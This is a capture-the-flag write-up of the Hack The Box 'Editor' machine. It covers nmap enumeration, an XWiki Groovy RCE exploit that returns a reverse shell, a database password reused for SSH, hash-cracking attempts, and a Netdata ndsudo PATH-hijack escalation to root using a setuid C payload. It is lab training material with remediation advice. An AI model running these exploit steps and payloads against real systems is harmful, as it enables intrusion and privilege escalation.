+++
date = '2026-06-11T15:22:19-04:00'
title = 'Editor'
tags = ["htb", "SUID exploit", "easy"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ba9dec0d022d3c3b6a96aa5dba4772c7.png)

https://www.hackthebox.com/machines/Editor
## OS: Linux
``` IP
10.129.231.23
```
## Credentials:

| Username | Password | Notes/Hash |
| -------- | -------- | ---------- |

---
## `nmap` results:
```
# Nmap 7.99 scan initiated Thu Jun 11 12:42:51 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Editor 10.129.231.23
Nmap scan report for 10.129.231.23
Host is up, received echo-reply ttl 63 (0.022s latency).
Scanned at 2026-06-11 12:42:52 EDT for 41s
Not shown: 64828 closed tcp ports (reset), 704 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.231.23:8080/xwiki/bin/view/Main/
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK**
```
Since port 80 redirects to `http://editor.htb`, let's add that to our `/etc/hosts`
```
echo "10.129.231.23 editor.htb" >> /etc/hosts
```
and re-run the `HTTP` default scans:
```
# Nmap 7.99 scan initiated Thu Jun 11 13:02:36 2026 as: /usr/lib/nmap/nmap -p80 -sC -sV -vv -oA nmap/HTTPDefaultScan 10.129.231.23
Nmap scan report for editor.htb (10.129.231.23)
Host is up, received echo-reply ttl 63 (0.017s latency).
Scanned at 2026-06-11 13:02:36 EDT for 7s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
 
---
## Attack + Enum Vectors
- TCP 8080: HTTP Jetty 10.0.20
- TCP 80: HTTP nginx 1.18.0
- TCP 22: SSH OpenSSH 8.9p1

### UDP (161 SNMP)?
- closed

---
## Service Enum Notes:
going on to:
```
http://10.129.231.23:8080
```
redirected us to:
```
http://10.129.231.23:8080/xwiki/bin/view/Main/
```
which exposed version on the bottom of the website:
```
XWiki Debian 15.10.8
```

Then, let's search on google if there is public known exploits:
```
XWiki 15.10.8 exploit site:github.com
```
yields a result that we can try:
```
https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC
```

---
## Initial Foothold
Let's first clone the exploit:
```
git clone https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC
```
then run the exploit:
```
python3 CVE-2025-24893-dbs.py -h
```
oh it seems like it's an interactive exploit?
```
   _______      ________    ___   ___ ___  _____     ___  _  _   ___   ___ ____  
  / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|   |__ \| || | / _ \ / _ \___ \ 
 | |     \ \  / /| |__ ______ ) | | | ) | | |__ ______ ) | || || (_) | (_) |__) |
 | |      \ \/ / |  __|______/ /| | | |/ /|___ \______/ /|__   _> _ < \__, |__ < 
 | |____   \  /  | |____    / /_| |_| / /_ ___) |    / /_   | || (_) |  / /___) |
  \_____|   \/   |______|  |____|\___/____|____/    |____|  |_| \___/  /_/|____/                                                                                                                                  
                                                                                 
                                                                                 

           CVE-2025-24893 - XWiki Groovy RCE Exploit                                      
                   exploit by @dollarboysushil

[?] Enter target URL (including http:// or https:// e.g http://10.10.10.18.10:8080):
```
and let's enter:
```
http://10.129.231.23:8080
```
then it prompts for:
```
[?] Enter your IP address (for reverse shell):
```
enter my HTB VPN IP address, and it asks for port, let's set up listener first:
```
sudo nc -lvnp 1337
```
and enter `1337`
```
[?] Enter the port number: 1337
```
waiting for a few seconds... We got reverse shell!

Stabilize the shell first:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
then `Ctrl+Z` to background the shell:
```
stty raw -echo;fg
```
```
reset
```
enter my terminal size:
```
stty rows 48 cols 210
```
and there we have a fully funcitoning shell!

---
## Priv Esc
```
cat /etc/passwd | grep -i "sh"
```
shows:
```
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```
so we know there is another user called `oliver`

First we land in the directory:
```
xwiki@editor:/usr/lib/xwiki-jetty
```
which contains:
```
ls -lah
```
```
drwxr-xr-x  5 root root 4.0K Jul 29  2025 .
drwxr-xr-x 91 root root 4.0K Jul 29  2025 ..
drwxr-xr-x  6 root root 4.0K Jul 29  2025 jetty
lrwxrwxrwx  1 root root   14 Mar 27  2024 logs -> /var/log/xwiki
drwxr-xr-x  2 root root 4.0K Jul 29  2025 start.d
-rw-r--r--  1 root root 5.5K Mar 27  2024 start_xwiki.bat
-rw-r--r--  1 root root 6.1K Mar 27  2024 start_xwiki_debug.bat
-rw-r--r--  1 root root  11K Mar 27  2024 start_xwiki_debug.sh
-rw-r--r--  1 root root 9.2K Mar 27  2024 start_xwiki.sh
-rw-r--r--  1 root root 2.5K Mar 27  2024 stop_xwiki.bat
-rw-r--r--  1 root root 6.6K Mar 27  2024 stop_xwiki.sh
drwxr-xr-x  3 root root 4.0K Jun 13  2025 webapps
```
we can read these `.sh`, let's note that down and maybe come back later.

looking at `ps aux`: it seems like the web service was started with `xwiki`:
```
xwiki       1259  0.0  0.0   7372  1920 ?        S    16:40   0:00 /bin/bash /usr/lib/xwiki-jetty/start_xwiki.sh
```
Interesting enough, there should be another HTTP port started on port `80`

Anyways, let's try to find the configuration file for `xwiki`: google:
```
xwiki configuration location for database settings
```
Google AI Overview tells us:
```
The primary file for XWiki database configuration is WEB-INF/hibernate.cfg.xml, which is located within your XWiki web application deployment directory
```
so let's go into `WEB-INF` then:
```
cat hibernate.cfg.xml
```
Oh lodrd, such long output, let's grep for `pass`:
```
cat hibernate.cfg.xml | grep -i "pass"
```
and we found: `theEd1t0rTeam99`, possibly `xwiki` as user:
```
cat hibernate.cfg.xml | grep -i "user"
```
shows `xwiki`. Try to use password for `oliver`? Failed, then enumerate `mysql`
```
mysql -u 'xwiki' -h localhost -p'theEd1t0rTeam99'
```
got in: show databases:
```
show databases;
```
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| xwiki              |
+--------------------+
5 rows in set (0.00 sec)
```
select `xwiki` first:
```
use xwiki
```
now look for tables:
```
show tables;
```
nothing too appealing, let's look `xwikistrings`
```
select * from xwikistrings;
```
and we found a hash I believe?
```
hash:SHA-512:dac65976a9f09bcd15bd2c5c6eae4c43b06f316be7ae6b191db26580b1211bef:6b8f547e3742e998380da4f9d426773430a7982a946b9bfd94da0d7abe0d472c5ff08fcb8b0a90
8bc293da82298053ba348872099bd88f059a7838c38b670153
```
let me try breaking the hash, but there is a `:` in between so I am not sure if it's 2 hashes or one is the salt or whatever, I will put separate it as 5 different hashes:
```
dac65976a9f09bcd15bd2c5c6eae4c43b06f316be7ae6b191db26580b1211bef
8bc293da82298053ba348872099bd88f059a7838c38b670153
6b8f547e3742e998380da4f9d426773430a7982a946b9bfd94da0d7abe0d472c5ff08fcb8b0a90
dac65976a9f09bcd15bd2c5c6eae4c43b06f316be7ae6b191db26580b1211bef:6b8f547e3742e998380da4f9d426773430a7982a946b9bfd94da0d7abe0d472c5ff08fcb8b0a90
6b8f547e3742e998380da4f9d426773430a7982a946b9bfd94da0d7abe0d472c5ff08fcb8b0a908bc293da82298053ba348872099bd88f059a7838c38b670153
```
But since we got a hint it's SHA-512 hashes, then the possible character length is: `64`, `88`, `128`. Now let's count each character length:
```
awk '{print length}' hashes.txt
64
50
78
143
128
```
which means that the first and last one is most likely to be valid:
```
hashcat hashes.txt /usr/share/wordlists/rockyou.txt
```
```
hashcat (v7.1.2) starting in autodetect mode
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 9 5950X 16-Core Processor, 6955/13911 MB (2048 MB allocatable), 8MCU

The following 18 hash-modes match the structure of your input hash:
      # | Name                                                       | Category
  ======+============================================================+======================================
  34600 | MD6 (256)                                                  | Raw Hash
   1400 | SHA2-256                                                   | Raw Hash
   1700 | SHA2-512                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  17600 | SHA3-512                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
  18000 | Keccak-512                                                 | Raw Hash
  31100 | ShangMi 3 (SM3)                                            | Raw Hash
   6100 | Whirlpool                                                  | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
   1770 | sha512(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
   5720 | Cisco-ISE Hashed Password (SHA256)                         | Operating System
  21000 | BitShares v0.x - sha512(sha512_bin(pass))                  | Cryptocurrency Wallet
```
I really hope I am not in a rabbit hole and this gets us something. Let's first crack for hashes that are `SHA-512`, so `-m = 1700,17600,1770`
```
hashcat -m 1700 hashes.txt /usr/share/wordlists/rockyou.txt
```
exhausted
```
hashcat -m 1770 hashes.txt /usr/share/wordlists/rockyou.txt
```
exhausted, and:
```
hashcat -m 17600 hashes.txt /usr/share/wordlists/rockyou.txt
```
exhausted. Let's try implementing `rules`?
```
hashcat -m 1770 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
exhausted
```
hashcat -m 1700 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
exhasuted, I probably fell in a rabbit hole:
```
hashcat -m 17600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
Let's try the salted one since we're already in rabbit hole anyway:
```
20800 | sha256(md5($pass)) 
```
```
hashcat -m 20800 hashes.txt /usr/share/wordlists/rockyou.txt
```
```
hashcat -m 20800 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
exhausted again... Let's go back and re-enumerate

I was pretty sure I am on the right track? HTB boxes tend to re-use DB passwords: I tried using `theEd1t0rTeam99` password to `su oliver` but didn't work. However:
```
ssh oliver@editor.htb
```
and using the password:
```
theEd1t0rTeam99
```
we got in as `oliver`? Wow, lesson learned, we should try password on both `su` and `ssh` to see if we can gain further access

```
id
```
returns:
```
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```
and look for SUID bits:
```
find / -perm -u=s -type f 2>/dev/null
```
yields non-default programs:
```
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```
Interesting, I have a feeling this is the path, let's google:
```
netdata privilege escalation
```
yields an interesting result that we may be able to abuse:
```
https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93
```
so appearantly it searches for the `PATH` variable for commands, in which we can hijack the path variable with a malicious payload and execute it in our desire:
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h
```
doesn't show the version but shows a list of commands:
```
The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD
```

Let's try to hijack the `nvme` executable then:
```
PATH=.:$PATH
```
then we create a malicious payload:
```
#!/bin/bash
chmod +s /bin/bash
```
named `nvme` and give it execute permissions:
```
chmod +x nvme
```
and run:
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
returned insufficient permissions error:

This means we probably need to make a program that is able to make itself with SUID permissions and execute it with the SUID root permissions that `ndsudo` has:

I used: https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC/blob/master/payload.c code to obtain a root shell:
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```
then compile it with the VHL taught way (since target has no `gcc`):
```
gcc -static test.c -o nvme
```
and transfer the new `nvme` to target
```
chmod +x nvme
```
then:
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
We got root shell!

Therefore, pwn'd.

---
## Conclusion & Remediation
This lab has quite a lot of rabbit holes, but with my previous experiences I identified them and quickly worked around them: the port 80 HTTP, and databases, etc. Also, I got to learn about how sometimes `su` doesn't work and `ssh` does work with credentials.

To remediate for similar attacks in this lab: system administrators needs to update the vulnerable `xwiki` to the most up to date version, and should keep users from re-using the same password for their account and any services. In addition, `SUID` binary programs should be most up to date to mitigate local privilege escalation risks.
## Digging More:
As I was researching, I came across https://0xdf.gitlab.io/2025/12/06/htb-editor.html#beyond-root and essentially `su` need to have `SUID` bit set to be able to successfully authenticate with password, but `NoNewPrivileges=true` in `/lib/systemd/system/xwiki.service` makes it so that we our `su` on the `xwiki` user does not have the SUID bit set therefore cannot authenticate us to `oliver`